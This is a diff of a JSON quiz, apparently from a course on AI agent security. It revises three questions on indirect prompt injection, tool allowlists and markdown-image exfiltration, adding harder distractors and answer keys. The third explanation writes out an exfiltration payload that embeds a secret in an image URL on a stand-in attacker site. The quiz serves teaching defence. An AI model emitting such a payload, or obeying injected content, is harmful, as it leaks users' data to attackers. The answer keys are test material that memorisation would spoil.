@@ -56,34 +56,34 @@
               "id": "q1-indirect",
               "prompt": "Why is indirect prompt injection considered harder to defend than direct injection?",
               "options": [
-                "It uses stronger encryption",
-                "The payload arrives inside content the agent legitimately reads — webpages, docs, RAG chunks — so the user never sees it",
-                "It only works on open-weight models"
+                "The attacker can iterate against your agent offline until a payload works",
+                "It bypasses the safety training, since the model never sees the instruction as user input",
+                "The payload arrives inside content the agent legitimately reads — webpages, docs, RAG chunks — so the user never sees it"
               ],
-              "correctIndex": 1,
-              "explanation": "You can filter what users type; you can't pre-read the whole internet your agent browses. Any content source becomes an instruction channel."
+              "correctIndex": 2,
+              "explanation": "You can filter what users type; you can't pre-read the whole internet your agent browses. Any content source becomes an instruction channel, and neither the user nor your input filter is in a position to notice. Offline iteration is true of direct injection too, so it explains nothing about the difference. And models do not have a privileged 'this is user input' channel to bypass — everything arrives as tokens in one context, which is the root cause of the whole problem rather than a detail of this attack."
             },
             {
               "id": "q2-allowlist",
               "prompt": "What makes a tool allowlist stronger than telling the model 'only use these tools' in the prompt?",
               "options": [
                 "Allowlists are enforced by code — a persuaded model still physically cannot call an unregistered tool",
-                "Allowlists use fewer tokens",
-                "There is no difference"
+                "Withholding the schemas means the model has no idea the other tools exist",
+                "The allowlist is evaluated per request, so it can tighten as the agent's trust level drops"
               ],
               "correctIndex": 0,
-              "explanation": "Prompts are suggestions; injections exist to override suggestions. Enforcement must live outside the model, in code."
+              "explanation": "Prompts are suggestions; injections exist to override suggestions. Enforcement must live outside the model, in code. Hiding the schemas is obscurity, not control — an injected payload can supply the tool name and arguments itself, and if nothing validates the call, the model will happily emit it. Dynamic scoping is a genuinely good design and worth building, but it is a refinement *of* enforcement: it decides what the allowlist contains, while the reason any of it holds is that code checks the call before it runs."
             },
             {
               "id": "q3-markdown",
               "prompt": "Why would a security reviewer flag a markdown image in a retrieved document chunk?",
               "options": [
-                "Images make responses slower",
+                "The alt text is a place to hide instructions the user will never read",
                 "Rendering the image fires a request to an attacker's URL — with whatever data was baked into it",
-                "Markdown is deprecated"
+                "The image itself can carry an injection payload the model reads when it looks at it"
               ],
               "correctIndex": 1,
-              "explanation": "Image URLs auto-fetch on render, making them a classic zero-click exfiltration channel. Sanitize retrieved content before display."
+              "explanation": "Image URLs auto-fetch on render, making this a classic zero-click exfiltration channel: the model is persuaded to write `![](https://attacker.site/log?d=<secret>)`, and the victim's browser sends the secret simply by displaying the answer. Nobody clicks anything. Hidden alt text is a real injection vector and worth sanitising, but it is an *input* problem; this is the rarer and nastier output-side one. Payloads embedded in image pixels are real against vision models, but a markdown link is just a URL — nothing has fetched the image yet."
             }
           ],
           "check": { "type": "quiz", "minCorrect": 3 }
